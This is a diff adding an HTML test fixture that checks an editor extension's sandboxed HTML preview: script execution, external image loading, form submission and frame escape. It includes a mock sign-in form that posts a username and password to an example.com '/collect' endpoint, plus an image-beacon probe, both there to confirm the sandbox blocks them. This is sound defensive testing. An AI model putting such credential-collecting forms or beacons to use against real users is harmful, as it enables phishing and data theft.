@@ -1,0 +1,96 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>HTML preview test fixture</title>
+    <style>
+      body {
+        font: 15px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+        margin: 0;
+        padding: 32px;
+        color: #1f2328;
+        background: #fff;
+      }
+      h1 { font-size: 20px; margin: 0 0 4px; }
+      .sub { color: #59636e; margin: 0 0 24px; }
+      section { border: 1px solid #d1d9e0; border-radius: 8px; padding: 16px 20px; margin: 0 0 16px; }
+      h2 { font-size: 15px; margin: 0 0 10px; }
+      .verdict { font-weight: 600; }
+      .pass { color: #1a7f37; }
+      .fail { color: #d1242f; }
+      code { background: #f6f8fa; padding: 1px 5px; border-radius: 4px; font-size: 13px; }
+      label { display: block; margin: 8px 0 2px; font-size: 13px; }
+      input { padding: 6px 8px; border: 1px solid #d1d9e0; border-radius: 6px; width: 220px; }
+      button { padding: 6px 12px; border-radius: 6px; border: 1px solid #d1d9e0; background: #f6f8fa; }
+      #script-probe { font-weight: 600; }
+    </style>
+  </head>
+  <body>
+    <h1>HTML preview test fixture</h1>
+    <p class="sub">Everything below is a check on the extension, not a real page.</p>
+
+    <section>
+      <h2>1. Does the document render at all?</h2>
+      <p>
+        If you can read this with a border around it and the heading above in bold, the
+        <code>html</code> kind is passing the file through untouched, which is the whole
+        contract for this kind.
+      </p>
+    </section>
+
+    <section>
+      <h2>2. Are scripts off?</h2>
+      <p>
+        Expected on open: <span class="verdict pass">scripts are OFF</span> — the line below
+        must still read "script did not run".
+      </p>
+      <p id="script-probe">script did not run</p>
+      <p>
+        After clicking <em>Enable scripts</em> on the preview it must change to
+        "script ran". Both states are correct; seeing "script ran" <em>before</em> clicking
+        is the failure, and it means <code>allowScriptsByDefault</code> leaked or the frame
+        was rebuilt with the wrong sandbox flags.
+      </p>
+      <script>
+        document.getElementById('script-probe').textContent = 'script ran';
+        document.getElementById('script-probe').className = 'fail';
+      </script>
+    </section>
+
+    <section>
+      <h2>3. Can the page reach the network?</h2>
+      <p>
+        The image below points at a real external host. It must render as a broken image —
+        <code>img-src</code> is <code>data: blob:</code> only, and that is what closes the
+        image-beacon exfiltration channel.
+      </p>
+      <p><img src="https://www.google.com/favicon.ico" alt="must not load" width="32" height="32" /></p>
+    </section>
+
+    <section>
+      <h2>4. Can a form submit anywhere?</h2>
+      <p>
+        A page like this is the reason scripts are off by default. With a static render there
+        is no keystroke capture, and <code>form-action 'none'</code> stops the POST. Type
+        anything and press the button — nothing must leave the frame.
+      </p>
+      <form action="https://example.com/collect" method="post">
+        <label for="u">Username</label>
+        <input id="u" name="u" autocomplete="off" />
+        <label for="p">Password</label>
+        <input id="p" name="p" type="password" autocomplete="off" />
+        <p><button type="submit">Sign in</button></p>
+      </form>
+    </section>
+
+    <section>
+      <h2>5. Can it escape the frame?</h2>
+      <p>
+        With scripts enabled, none of these may work: reading <code>window.parent</code>,
+        opening a popup, or navigating the top frame. The frame has no
+        <code>allow-same-origin</code>, no <code>allow-popups</code>, and no top navigation.
+      </p>
+      <p><button onclick="location.href='https://example.com'">Try to navigate away</button></p>
+    </section>
+  </body>
+</html>
